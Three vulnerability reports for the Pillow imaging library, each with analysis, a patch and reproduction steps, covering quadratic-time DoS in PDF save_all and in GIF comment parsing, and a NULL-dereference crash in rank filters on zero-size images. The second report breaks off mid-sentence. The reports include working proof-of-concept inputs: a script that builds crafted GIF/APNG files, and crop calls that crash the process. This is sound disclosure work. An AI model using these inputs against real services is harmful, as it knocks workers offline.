summary: Quadratic-time DoS in PDF save_all (PdfParser.next_object_id)
description:
``` ============================================================================ ANT-2026-AIO3JD97 [medium] CWE-407 dos Quadratic-time DoS in PDF save_all (PdfParser.next_object_id) Location: src/PIL/PdfParser.py:629 in next_object_id() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow's PDF writer takes time proportional to the square of the number of frames when it saves a multi-frame image as a multi-page PDF. Anyone who can get an application to convert their uploaded image this way can tie up a worker at full CPU for minutes with a small file. A 240 KB animated image takes about 70 seconds, a 720 KB one an estimated 10 minutes, and a 125-byte animated PNG that merely *declares* a large frame count triggers the same slowdown with no upper bound short of 2³¹ frames. Memory stays under 100 MB and the decompression-bomb limit never applies. The cause is `PdfParser.next_object_id()` in `src/PIL/PdfParser.py`, which finds the next free id by computing `max(self.xref_table.keys())`. `XrefTable.keys()` rebuilds three sets over every id reserved so far on each call. `PdfImagePlugin._save()` calls it three times (four for palette images with transparency) per frame, for `n_frames` frames, before any page is written. That makes the id-reservation loop alone O(N²). Because `n_frames` is taken from the file before any frame is seeked, APNG's `acTL` count drives the loop even when the frames don't exist. In that case the save raises `OSError` only after the full delay. The precondition is that the application calls `im.save(..., "PDF", save_all=True)` on the attacker's file; `Image.open()` and `load()` alone do not reach this code. The attached reproducer shows 4× the frames costing about 11× the CPU for a valid GIF and about 16× for a fixed 125-byte APNG. The behaviour was introduced in `6207b44ab1ff` (2018-01-18) and first shipped in Pillow 5.1.0. A small patch that tracks the highest id in `XrefTable` makes the save linear. ## Details Saving a multi-frame image as a multi-page PDF (`im.save(fp, "PDF", save_all=True)`) costs CPU time proportional to the square of the frame count, independent of pixel content, because every object id the PDF writer reserves is found by rebuilding and scanning the set of all ids reserved so far. A 1×1-pixel animated GIF made of N identical 15-byte frames (built by the reproducer) gives, on a 2-CPU container with the stock build at this commit (absolute timings vary by machine; the growth rate does not): | frames | GIF size | `im.save(BytesIO(), "PDF", save_all=True)` | peak RSS | |---|---|---|---| | 2 000 | 30 KB | 1.1 s | | | 8 000 | 120 KB | 14.7 s | | | 16 000 | 240 KB | 70 s | 60 MB | | 32 000 | 480 KB | 262 s | 95 MB | | 48 000 | 720 KB | still running at 120 s (extrapolated ≈ 10 min) | | Each doubling of the input roughly quadruples the time. `cProfile` of the 8 000-frame save attributes 13.5 s of 17.6 s to 24 003 calls of `PdfParser.next_object_id` (8.9 s inside `XrefTable.keys`, 3.9 s inside `max`); encoding and writing the 8 000 pages is the remaining ~4 s and scales linearly. The per-page id reservation loop runs before any page is written: ```python # src/PIL/PdfImagePlugin.py:247-259 (_save) for im in ims: im_number_of_pages = 1 if save_all: im_number_of_pages = getattr(im, "n_frames", 1) … for i in range(im_number_of_pages): image_refs.append(existing_pdf.next_object_id(0)) if im.mode == "P" and "transparency" in im.info: image_refs.append(existing_pdf.next_object_id(0)) page_refs.append(existing_pdf.next_object_id(0)) contents_refs.append(existing_pdf.next_object_id(0)) ``` `n_frames` comes straight from the file (for GIF it is the number of image blocks; the GIF plugin counts them by walking block headers, which is cheap). The frames do not even have to exist: the loop runs on `n_frames` before any frame is seeked, and for APNG `n_frames` is the `num_frames` value declared in the `acTL` chunk, rejected only if it is 0 or above `0x80000000` (`src/PIL/PngImagePlugin.py:716-720`). A 125-byte APNG declaring 8 000 frames therefore costs the same ~10–13 s as the 120 KB GIF, and more without bound as the declared count grows. Each of the 3 (or 4, for `P` images with transparency) calls per frame lands here: ```python # src/PIL/PdfParser.py:626-634 def next_object_id(self, offset: int | None = None) -> IndirectReference: try: # TODO: support reuse of deleted objects reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) except ValueError: reference = IndirectReference(1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference # src/PIL/PdfParser.py:175-178 (XrefTable) def keys(self) -> set[int]: return ( set(self.existing_entries.keys()) - set(self.deleted_entries.keys()) ) | set(self.new_entries.keys()) ``` `_save` passes `offset=0`, so every reserved id is inserted into `xref_table.new_entries`. The k-th call therefore materialises three sets covering all k−1 previous ids, computes a difference and a union, and then `max()` scans the result — O(k) work to produce the integer k. Summed over 3N calls this is O(N²): for 48 000 frames, 144 002 calls over sets growing to 144 002 elements, on the order of 10¹⁰ set-element operations, all spent before `_write_image` is reached for the first frame. Nothing on this path consults `MAX_IMAGE_PIXELS` (the frames are 1×1) and nothing raises; for the GIF the save eventually completes and produces a valid PDF, and for the declared-only APNG it raises `OSError` only once the id loop has finished and the first missing frame is seeked. This reservation scheme was introduced in `6207b44ab1ff` ("issue #2959: support appending to existing PDFs", 2018-01-18) and first shipped in Pillow 5.1.0; before it, the writer numbered objects arithmetically. For contrast, `write_obj(ref, …)` with an already-reserved `ref` (`src/PIL/PdfParser.py:548-555`) only does a dict store, which is why the page-writing phase that follows is linear; the super-linear cost is entirely in how the next free id is computed. ## Impact The precondition is that the application saves the attacker's image as PDF with `save_all=True`; `Image.open()` and `load()` alone do not reach this code. An application that converts uploaded images to PDF this way — the documented way to get one page per frame from animated GIF/APNG/WebP or multi-page TIFF input — can have a worker held at 100 % CPU for about 10 minutes by a 720 KB GIF, about 4½ minutes by a 480 KB one, with the cost continuing to grow quadratically with upload size. With APNG the file size does not matter at all: a 125-byte file declaring N frames in `acTL` drives the same quadratic loop, up to the 2³¹ cap. The attacker controls only the file bytes; no unusual dimensions, modes or options are needed, memory use stays under 100 MB so memory limits do not intervene, and the decompression-bomb guard is not applicable. The consequence is denial of service of the process performing the conversion. Single-image PDF saves, and `save_all` saves of images with tens or hundreds of frames, are unaffected in practice. This is the same family as earlier accidentally-quadratic parsing issues fixed in Pillow (e.g. CVE-2021-28677, EPS `readline`), but on the PDF *writer* side, reached only through a save rather than on open, and driven by frame count rather than by line structure. ## Reproducing `repro` is a single Python script. Run it with the Python that has Pillow installed (`./repro`). It uses under 100 MB of RAM and writes no files. **Input.** Two kinds of file are built in memory, each with 2 000 and 8 000 frames: - `gif(n)`: a valid animated GIF — a `GIF89a` header with a 1×1 logical screen and a 2-colour global palette, then `n` copies of one 15-byte frame (a 1×1 image descriptor plus the LZW data for one pixel), then the trailer (30 and 120 KB). The only unusual thing about it is how many frames it has. - `apng(n)`: a 125-byte APNG — a 1×1 greyscale `IHDR`, an `acTL` chunk declaring `n` frames, one `fcTL`, one `IDAT` and `IEND`. Only the first frame exists; the other `n − 1` are merely declared. **Action.** Each file goes through what an upload-to-PDF converter would do: `Image.open(BytesIO(data))`, then `im.save(BytesIO(), "PDF", save_all=True)`, timed with `time.process_time()`. For the APNG the save raises `OSError` once the writer tries to seek to the second frame; that happens after the id-reservation loop has run for all `n` declared frames, so the exception is caught and the CPU time up to it is recorded. **Expected output** (stock build at this commit): ``` GIF frames= 2000 file= 30020 B save CPU= 1.03s result=ok GIF frames= 8000 file=120020 B save CPU= 11.68s result=ok GIF: 4x frames -> 11.3x CPU (linear ~4x, quadratic ~16x) APNG frames= 2000 file= 125 B save CPU= 0.65s result=OSError(Truncated File Read) APNG frames= 8000 file= 125 B save CPU= 10.48s result=OSError(Truncated File Read) APNG: 4x frames -> 16.1x CPU (linear ~4x, quadratic ~16x) BUG ``` A linear save would take about 4× as long for 4× the frames; here the GIF save grows ~11× and the APNG save ~16×, the latter with the file size fixed at 125 bytes. The script prints `BUG` when the save CPU for either format grows at least 8× for 4× the frames (twice the linear expectation), otherwise `OK`. Extending the same curve gives the figures in the table above: about 70 s at 16 000 frames (240 KB GIF), and about 10 minutes for a 720 KB file. With the attached patch applied, the GIF save takes 0.32 s / 1.20 s (3.7×) and the APNG save 0.01 s / 0.03 s, and the script prints `OK`. ## Suggested fix Make `next_object_id()` O(1) by tracking the highest object id ever stored in `XrefTable` instead of rebuilding the key set on every call. The attached patch does this in `src/PIL/PdfParser.py`: ```diff --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ class XrefTable: self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ class PdfParser: def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` `existing_entries` is only ever populated through `__setitem__` (from `read_xref_table` / `read_prev_trailer`), so the counter also covers ids read from an existing file in `append=True` mode. The one behavioural difference: when the highest-numbered existing object has just been deleted (`del_root()` / `rewrite_pages()` in append mode), the current code hands that id out again with generation 0, whereas the patch moves on to the next unused id — the more conservative choice for an xref table, and the one the existing `TODO: support reuse of deleted objects` comment points at. With the patch applied and Pillow rebuilt, the 16 000-frame save drops from ~70 s to ~2.5 s, fresh PDF output is unchanged, `Tests/test_file_pdf.py` and `Tests/test_pdfparser.py` pass, and the reproducer prints `OK`. An alternative limited to the writer would be to reserve the `3 × number_of_pages` ids in `PdfImagePlugin._save()` arithmetically from a single `next_object_id()` call, but fixing the allocator also covers `write_obj(None, …)` callers. The patch does not address a separate, linear issue: `PdfImagePlugin._save()` still trusts `n_frames` before any frame is decoded, so a tiny file whose format reports a declared-only frame count (APNG `acTL` up to 2³¹) still makes it loop `3 × n_frames` times before the first failing seek. Reserving ids per successfully seeked frame, or validating `n_frames` in such plugins, would close that. ## The patch Track the highest object ID in XrefTable so PdfParser.next_object_id() is O(1) instead of rebuilding and scanning the key set Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..82ebfb867 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -133,12 +133,15 @@ class XrefTable: ) # object ID => (offset, generation) self.deleted_entries = {0: 65536} # object ID => generation self.reading_finished = False + self.max_object_id = 0 # highest object ID ever stored, deleted or not def __setitem__(self, key: int, value: tuple[int, int]) -> None: if self.reading_finished: self.new_entries[key] = value else: self.existing_entries[key] = value + if key > self.max_object_id: + self.max_object_id = key if key in self.deleted_entries: del self.deleted_entries[key] @@ -624,11 +627,8 @@ class PdfParser: self.orig_pages = self.pages[:] def next_object_id(self, offset: int | None = None) -> IndirectReference: - try: - # TODO: support reuse of deleted objects - reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) - except ValueError: - reference = IndirectReference(1, 0) + # TODO: support reuse of deleted objects + reference = IndirectReference(self.xref_table.max_object_id + 1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference ``` ## The reproducer
Reproducer — repro, 1,791 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # PDF save_all is O(frames^2): PdfParser.next_object_id() does max(XrefTable.keys()), # and keys() rebuilds sets of every id reserved so far, 3 calls per frame. # (a) valid 1x1 animated GIF, 15 bytes/frame; (b) 125-byte APNG whose acTL merely # *declares* N frames - ids are reserved for all N before the first seek fails. import io, struct, time, zlib from PIL import Image def gif(n): return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff" + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00" * n + b"\x3b") def apng(n): def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d)) return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)) + chunk(b"acTL", struct.pack(">II", n, 0)) + chunk(b"fcTL", struct.pack(">IIIIIHHBB", 0, 1, 1, 0, 0, 1, 1, 0, 0)) + chunk(b"IDAT", zlib.compress(b"\x00\x00")) + chunk(b"IEND", b"")) def save_pdf(data): im = Image.open(io.BytesIO(data)) t = time.process_time() try: im.save(io.BytesIO(), "PDF", save_all=True) res = "ok" except OSError as e: # APNG: frames don't exist, fails *after* the id loop res = f"OSError({e})" return time.process_time() - t, res bug = False for name, make in (("GIF", gif), ("APNG", apng)): t = {} for n in (2000, 8000): data = make(n) t[n], res = save_pdf(data) print(f"{name:4} frames={n:5} file={len(data):6} B save CPU={t[n]:6.2f}s result={res}") growth = t[8000] / t[2000] print(f"{name}: 4x frames -> {growth:.1f}x CPU (linear ~4x, quadratic ~16x)") if growth >= 8: bug = True print("BUG" if bug else "OK") ```

summary: Quadratic GIF comment concatenation allows DoS in Image.open()
description: ``` ============================================================================ ANT-2026-W8J1U4KZ [medium] CWE-407 dos Quadratic GIF comment concatenation allows DoS in Image.open() Location: src/PIL/GifImagePlugin.py:266 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Opening a crafted GIF file with `Image.open()` takes time that grows with the square of the file's size, so anyone who can submit an image to a service that uses Pillow can keep one worker busy at full processor load for a long time with a small file. A 2 MB file takes about 5 seconds to open, a 4 MB file about 35 seconds, and an 8 MB file about 3 minutes. An ordinary GIF of the same size opens in well under a second. The cost is paid inside `Image.open()` itself, with default settings, before the application has seen the image's size or format. The bug is in `GifImageFile._seek()` in `src/PIL/GifImagePlugin.py`, which builds `info["comment"]` by appending to an immutable `bytes` object with no size limit. It appends once per 255-byte sub-block (`comment += block`, line 261) and once per comment extension (`info["comment"] += b"\n" + comment`, line 266). Each append copies everything collected so far. A file made of many tiny comment extensions forces a full re-copy for each one. Because `_open()` ends with `self._seek(0)`, any code that only opens an uploaded file to identify it, read its dimensions, or make a thumbnail pays the full cost. The decompression-bomb check does not help, since the image is 1×1. Memory use stays linear, so the effect is processor exhaustion and latency, bounded by whatever upload size the service allows (about 1 second at 1 MB). This is the same kind of issue as the EPS open-phase slowdown fixed as CVE-2021-28677, here in the GIF comment handling. The quadratic pattern was introduced in commit b2b737b68b06 ("Allow arbitrary number of comment extension subblocks", November 2018) and has shipped since Pillow 5.4.0. The attached script builds 2 MB and 4 MB test files and compares each against a byte-identical control whose extensions are labelled as plain text instead of comment. The 4 MB comment file took about 34 seconds to open, against 0.26 seconds for its control. A patch that collects the pieces in a list and joins them once is also attached. ## Details `GifImageFile._seek()` collects GIF comment extensions into `info["comment"]` using `bytes` concatenation, once per 255-byte sub-block and once per comment extension, with no limit on the total. `bytes` is immutable, so every `+=` allocates a new object and copies everything accumulated so far; the work done by `Image.open()` is therefore quadratic in the amount of comment data in frame 0. A 1×1 GIF89a whose body is nothing but the 5-byte comment extension `21 FE 01 41 00` repeated makes this directly observable. `Image.open(BytesIO(data))` on such a file, stock build at this commit, 2-CPU machine: | file size | comment extensions (`21 FE …`) | same bytes labelled plain-text extension (`21 01 …`) | |---|---|---| | 1 MB | 1.2 s | 0.09 s | | 2 MB | 4.9 s | 0.13 s | | 4 MB | 35 s | 0.26 s | | 8 MB | 183 s | — | The control column is the identical byte stream with the extension label changed from `0xFE` to `0x01`; it goes through the same loop and the same `self.data()` reads but is discarded instead of concatenated, and scales linearly. No `load()` is needed and no warning or exception is raised; `im.info["comment"]` simply ends up holding the multi-megabyte blob. The code, `src/PIL/GifImagePlugin.py:229-281` (trimmed): ```python elif s == b"!": s = self.fp.read(1) block = self.data() … elif s[0] == 254: # # comment extension # comment = b"" # Read this comment block while block: comment += block # :261 one copy per sub-block block = self.data() if "comment" in info: # If multiple comment blocks in frame, separate with \n info["comment"] += b"\n" + comment # :266 one copy per extension else: info["comment"] = comment s = b"" continue … while self.data(): # every other extension: read and drop pass ``` `self.data()` (`:97-102`) reads one length byte and then that many bytes, so each call is cheap and bounded; the cost is entirely in the two `+=` lines. For a single comment extension of N bytes delivered as N/255 sub-blocks, line 261 copies about N²/510 bytes in total (4 MB → 2.3 s, 8 MB → 9.5 s, 16 MB → 38 s measured). Splitting the same data into many small comment extensions is worse, because line 266 re-copies the whole of `info["comment"]` once per extension: with 1-byte extensions a file of F bytes causes roughly F²/25 bytes of copying, which is the table above (growth ×4–7 per doubling once the buffer outgrows the CPU caches). This runs during `Image.open()`: `_open()` ends with `self._seek(0)` (`:135`), so any application that merely opens an uploaded file to identify it, read its size, or thumbnail it pays the full cost before it has made any decision about the image. `Image._decompression_bomb_check` is not involved (the image is 1×1), and unlike PNG text chunks (`PngImagePlugin.MAX_TEXT_CHUNK` / `MAX_TEXT_MEMORY`) there is no cap on GIF comment size. Later frames repeat the same loop for their own comments via `seek()` / `n_frames`. With both `+=` sites replaced by list-append and a single `b"".join()` (as in the attached patch), the same 16 MB single-extension file opens in 0.03 s, confirming the concatenation is the whole cost. ## Impact Anyone who can get a GIF to a service that calls `PIL.Image.open()` on it — avatar/media uploads, thumbnailers, format sniffing, anything using `ImageOps`/`thumbnail()` on user files — can pin one worker process at 100 % CPU for about 5 s with a 2 MB file, 35 s with a 4 MB file and 3 minutes with an 8 MB file, under default settings, with the time growing quadratically in the permitted upload size. A benign GIF of the same size opens in well under a second, so request-cost assumptions based on file size do not hold. Memory use is only linear (the comment is retained in `im.info["comment"]`), so the effect is CPU/latency denial of service of the worker pool rather than memory exhaustion; a handful of concurrent uploads is enough to saturate a typical pool. Upload size limits bound it (≈1 s at 1 MB). This is the same shape as CVE-2021-28677 ("EPS DOS on _open", `docs/releasenotes/8.2.0.rst`), where a quadratic method of accumulating data in the open phase, before the image was accepted, was treated as a denial-of-service vulnerability; here the format is GIF and the accumulator is the comment extension. The quadratic accumulation was introduced in `b2b737b68b06` ("Allow arbitrary number of comment extension subblocks", 2018-11-27), first released in Pillow 5.4.0. ## Reproducing `repro` is a single Python script that uses the installed Pillow. Run it with no arguments. It needs no files, no network and no rebuild. It builds two GIFs of the same length, at 2 MB and at 4 MB. Each is the 13-byte GIF89a header for a 1×1 screen, followed by `size/5` copies of the 5-byte extension `21

summary: NULL dereference in ImagingExpand via rank filters on zero-size images
description:
``` ============================================================================ ANT-2026-LSEKKVQZ [medium] CWE-476 memory-safety NULL dereference in ImagingExpand via rank filters on zero-size images Location: src/libImaging/Filter.c:79 in ImagingExpand() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Applying Pillow's median, minimum, maximum or rank filter to an image with zero width or zero height crashes the whole Python process instead of raising an error. Empty images like this are easy to produce with ordinary calls, for example a crop box whose left and right edges (or top and bottom edges) are equal, or the second page of a crafted multi-page image file. An attacker who can supply crop coordinates or an uploaded file to an application that runs one of these filters can kill its worker process. The effect is a crash only, with no memory disclosure or corruption. The fault is in `ImagingExpand()` in `src/libImaging/Filter.c`. This is the edge-padding step that `RankFilter.filter()` always runs through the core `expand()` method, so `MedianFilter`, `MinFilter` and `MaxFilter` go through it too. It fills the margin by copying the input's edge pixels, reading `imIn->image[y][0]` and rows `0` / `ysize-1`, and never checks that the input has any pixels. For an empty image, `ImagingAllocateArray` leaves the line pointers NULL, so the first read dereferences NULL and the process dies with SIGSEGV, in every mode. Zero-size images reach this point through public API alone: - `Image.crop()`, `ImageOps.crop()` and `Image.new()`; - a multi-page TIFF opened by path whose second IFD declares `ImageLength = 0`, on which `seek(1)` and `load()` succeed. Every other `ImageFilter` returns an empty image for the same inputs. The zero-height case has crashed since the original PIL import, and the zero-width case since Pillow 4.3.0. This is separate from the `margin == 0` fix in #9755: the path is the same, but here the degenerate value is the image size rather than the kernel size. It has the same shape as the zero-dimension `ImagingOffset` crash fixed under GHSA-f87v-9578-p47w. The attached reproducer shows a one-pixel-wide control crop filtering normally, while four empty crops passed through the rank filters are each killed by SIGSEGV. A patch that returns early in `ImagingExpand` for empty input is included. ## Details `ImagingExpand()` (`src/libImaging/Filter.c`), the edge-padding helper that `ImageFilter.RankFilter` runs before the actual rank filter, reads the first pixel of each input line without checking that the input has any pixels. For an image with width 0 or height 0 the line pointers are NULL, so `Image.filter()` with `MedianFilter`, `MinFilter`, `MaxFilter` or `RankFilter` kills the interpreter with SIGSEGV instead of returning or raising: ```python from PIL import Image, ImageFilter im = Image.new("L", (10, 10)).crop((3, 0, 3, 10)) # size (0, 10); crop() accepts left == right im.filter(ImageFilter.MedianFilter(3)) # SIGSEGV ``` Under gdb on the stock build the fault is at `ImagingExpand (imIn=…, margin=1) at src/libImaging/Filter.c:105` (the `EXPAND(UINT8, image8)` expansion), called from `_expand_image` at `src/_imaging.c:1151`, with `imIn->xsize = 0` and `imIn->image[0] = 0x0`. The same happens for every mode the rank filters accept (`L`, `RGB`, `RGBA`, `I`, `F`), and the core `expand(m)` method with `m >= 1` crashes the same way in any mode, including `P`. The same input through `BoxBlur`, `GaussianBlur`, `Kernel`, `ModeFilter` and `UnsharpMask` returns a `(0, 10)` image; a `(1, 10)` crop through `MedianFilter` also returns normally. The unchecked edge reads date from the PIL import (`9a640e315`, 2010, so every Pillow release): the zero-height case has crashed since then, and the zero-width case since `fd907fbdc` ("Fix 0-width and 0-height images other way", Pillow 4.3.0), which stopped backing zero-width images with a dummy block and left their row pointers NULL. It is adjacent to the `margin == 0` divide-by-zero fix in #9755 — same `expand()` → `ImagingExpand()` path, but the unhandled degenerate value here is the image size rather than the kernel size. The path: ```python # src/PIL/ImageFilter.py:111-116 RankFilter.filter (MedianFilter/MinFilter/MaxFilter subclass it) image = image.expand(self.size // 2) return image.rankfilter(self.size, self.rank) ``` `expand(m)` with `m > 0` is `ImagingExpand(self->image, m)` (`src/_imaging.c:1142-1151`). It validates only `margin`, allocates an output of `(xsize+2*margin) × (ysize+2*margin)` — which is non-empty, so the allocation succeeds — and then fills the margin by replicating edge pixels of the input: ```c // src/libImaging/Filter.c:70-101 imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); … #define EXPAND_LINE(type, image, yin, yout) \ { \ for (x = 0; x < margin; x++) { \ imOut->image[yout][x] = imIn->image[yin][0]; \ // line 79 } \ … \ for (x = 0; x < margin; x++) { \ imOut->image[yout][margin + imIn->xsize + x] = \ imIn->image[yin][imIn->xsize - 1]; \ // [-1] when xsize == 0 } \ } #define EXPAND(type, image) \ { \ for (y = 0; y < margin; y++) { \ EXPAND_LINE(type, image, 0, y); \ // line 0 of a 0-line image } \ … for (y = 0; y < margin; y++) { \ EXPAND_LINE(type, image, imIn->ysize - 1, margin + imIn->ysize + y); \ // line -1 when ysize == 0 } \ } ``` Why the line pointers are NULL: `ImagingNewPrologueSubtype` callocs the `im->image` pointer array (`src/libImaging/Storage.c:216`, at least one entry), and `ImagingAllocateArray` returns before assigning any of them for an empty image: ```c // src/libImaging/Storage.c:423-426 /* 0-width or 0-height image. No need to do anything */ if (!im->linesize || !im->ysize) { return im; } ``` So with `xsize == 0` every `imIn->image[y]` is NULL and `imIn->image[yin][0]` faults; with `ysize == 0` the top-margin pass reads `imIn->image[0]` (the single calloc'd NULL slot) and faults the same way, and the bottom-margin pass would index `imIn->image[-1]`. `ImagingRankFilter` is never reached. Zero-size images are ordinary objects in Pillow and arrive at `filter()` through public API only: - `Image.crop(box)` rejects only inverted boxes (`src/PIL/Image.py:1385-1390`); `left == right` or `upper == lower` yields a 0×N / N×0 image. `ImageOps.crop(im, border)` with `border == width // 2`, and `Image.new(mode, (0, n))`, do the same. - From a file: `ImageFile.__init__` refuses a zero first-frame size (`src/PIL/ImageFile.py:167-173`), but `TiffImagePlugin._setup()` takes `ImageWidth`/`ImageLength` of every later IFD as-is on `seek()` (`src/PIL/TiffImagePlugin.py:1468-1481`). For an uncompressed page of an image opened by path, `ImageFile.load()` takes the mmap branch (`src/PIL/ImageFile.py:307, 325-347`) and `Image.core.map_buffer` builds an `8×0` core image without complaint (`src/map.c:127-141`), so `im.seek(1); im.load()` succeeds and a following `im.filter(ImageFilter.MedianFilter(3))` segfaults in `ImagingExpand` exactly as above (verified under gdb: `imIn->ysize = 0`, `imIn->image[0] = 0x0`). A 384-byte two-page TIFF is enough. ## Impact Denial of service: the whole embedding process (web worker, pipeline process) dies with SIGSEGV rather than the request failing with a Python exception. It is reachable by a remote user in two realistic shapes: (a) an application that crops an upload to user-supplied coordinates and then applies a median/min/max filter (denoise, dilate/erode, thumbnail clean-up) — a box with `x0 == x1` or `y0 == y1` passes `crop()` and crashes the worker; (b) an application that opens an uploaded TIFF from disk by path, iterates its pages and applies a rank filter to each — a crafted second IFD with `ImageLength = 0` crashes it. The faulting access is a read at address 0 (or a fixed small negative offset from the pointer array for the `[-1]` cases, which is not reached because the first read already faults), so there is no memory disclosure or corruption beyond the crash. The same shape, a zero-dimension image crashing C code reached through public API, was fixed in `ImagingOffset` in 39d14a0db (GHSA-f87v-9578-p47w). ## Reproducing `repro` is a single Python script that uses the installed Pillow as-is (no rebuild). It runs each case in a fresh child interpreter, with core dumps disabled. That way a segfault shows up as the child's exit status and the script itself keeps running. Each child builds `Image.new("L", (10, 10)).crop(box)`, prints its size, calls `im.filter(...)` and then prints the size of the result. - **Control**: a `(1, 10)` crop (`(3, 0, 4, 10)`) through `MedianFilter(3)`. The rank filter accepts a thin image and must return normally. - **PoC**: the rank filters on empty crops. - A `(0, 10)` crop (`left == right`, `(3, 0, 3, 10)`) through `MedianFilter(3)` and `MaxFilter(5)`. - A `(10, 0)` crop (`upper == lower`, `(0, 3, 10, 3)`) through `MinFilter(3)`. - A `(0, 0)` crop (`(3, 3, 3, 3)`) through `RankFilter(3, 4)`. Expected output on the stock build: ``` crop(3, 0, 4, 10) MedianFilter(3) (1, 10) -> (1, 10) crop(3, 0, 3, 10) MedianFilter(3) (0, 10) -> killed by SIGSEGV crop(3, 0, 3, 10) MaxFilter(5) (0, 10) -> killed by SIGSEGV crop(0, 3, 10, 3) MinFilter(3) (10, 0) -> killed by SIGSEGV crop(3, 3, 3, 3) RankFilter(3, 4) (0, 0) -> killed by SIGSEGV BUG ``` The size printed before `->` shows that the empty image was created without error. The crash happens inside `filter()`, in `ImagingExpand`. The last line is `BUG` if the control returned normally and at least one rank-filter child was killed by SIGSEGV. Otherwise it is `OK`. The script covers the crop route only; the TIFF route described above fails the same way (`im.seek(1); im.load(); im.filter(ImageFilter.MedianFilter(3))` on a by-path two-page TIFF whose second IFD has `ImageLength = 0`). With the attached patch, every PoC line prints the unchanged size (for example `(0, 10) -> (0, 10)`) and the script prints `OK`. ## Suggested fix The attached patch handles the empty input in `ImagingExpand` (`src/libImaging/Filter.c`), right after the `margin` checks and before the `ImagingNewDirty` allocation and the replication loops. With `xsize == 0` or `ysize == 0` there are no edge pixels to replicate, so it returns a zeroed (`ImagingNew`, not `ImagingNewDirty`) image of the expanded size, with the input's palette copied. This keeps `ImagingExpand`'s size contract, so `ImagingRankFilter` then produces an output of `xsize - 2*margin` × `ysize - 2*margin`, i.e. the original empty size, matching every other filter. It mirrors the existing zero-dimension early returns in `src/libImaging/BoxBlur.c` (127004368) and `src/libImaging/Offset.c` (39d14a0db): ```diff --- a/src/libImaging/Filter.c +++ b/src/libImaging/Filter.c @@ -67,6 +67,17 @@ ImagingExpand(Imaging imIn, int margin) { return (Imaging)ImagingError_ValueError("filter size too large"); } + if (imIn->xsize == 0 || imIn->ysize == 0) { + /* No edge pixels to replicate (and no lines to read from), so + return a zeroed image of the expanded size */ + imOut = ImagingNew(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); + if (!imOut) { + return NULL; + } + ImagingCopyPalette(imOut, imIn); + return imOut; + } + imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); if (!imOut) { ``` The patch also adds `test_rankfilter_zero_dimension` next to `test_rankfilter_error` in `Tests/test_image_filter.py`, which filters `Image.new("L", size)` for `size` in `((0, 6), (6, 0), (0, 0))` with `MinFilter`, `MedianFilter`, `MaxFilter` and `RankFilter(3, 2)` and asserts the size is preserved. Applied to a clean checkout and rebuilt, the reproducer prints `OK` and `Tests/test_image_filter.py` passes. A Python-level guard in `RankFilter.filter` (`if 0 in image.size: return image.copy()`) would also stop the crash, but the C-level check protects any other caller of `expand()`. ## The patch Return a zeroed image from ImagingExpand when the input has zero width or height instead of reading NULL line pointers Applies to `src/libImaging/Filter.c` at the commit above. ```diff diff --git a/Tests/test_image_filter.py b/Tests/test_image_filter.py index 974d4b7a3..8dc8e1a1a 100644 --- a/Tests/test_image_filter.py +++ b/Tests/test_image_filter.py @@ -155,6 +155,23 @@ def test_rankfilter_error(filter: ImageFilter.RankFilter) -> None: im.filter(filter).getpixel((1, 1)) +@pytest.mark.parametrize( + "filter", + ( + ImageFilter.MinFilter, + ImageFilter.MedianFilter, + ImageFilter.MaxFilter, + ImageFilter.RankFilter(3, 2), + ), +) +@pytest.mark.parametrize("size", ((0, 6), (6, 0), (0, 0))) +def test_rankfilter_zero_dimension( + filter: ImageFilter.RankFilter, size: tuple[int, int] +) -> None: + im = Image.new("L", size) + assert im.filter(filter).size == size + + def test_rankfilter_properties() -> None: rankfilter = ImageFilter.RankFilter(3, 2) diff --git a/src/libImaging/Filter.c b/src/libImaging/Filter.c index 3492a871f..d702db5f9 100644 --- a/src/libImaging/Filter.c +++ b/src/libImaging/Filter.c @@ -67,6 +67,17 @@ ImagingExpand(Imaging imIn, int margin) { return (Imaging)ImagingError_ValueError("filter size too large"); } + if (imIn->xsize == 0 || imIn->ysize == 0) { + /* No edge pixels to replicate (and no lines to read from), so + return a zeroed image of the expanded size */ + imOut = ImagingNew(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); + if (!imOut) { + return NULL; + } + ImagingCopyPalette(imOut, imIn); + return imOut; + } + imOut = ImagingNewDirty(imIn->mode, imIn->xsize + 2 * margin, imIn->ysize + 2 * margin); if (!imOut) { ``` ## The reproducer
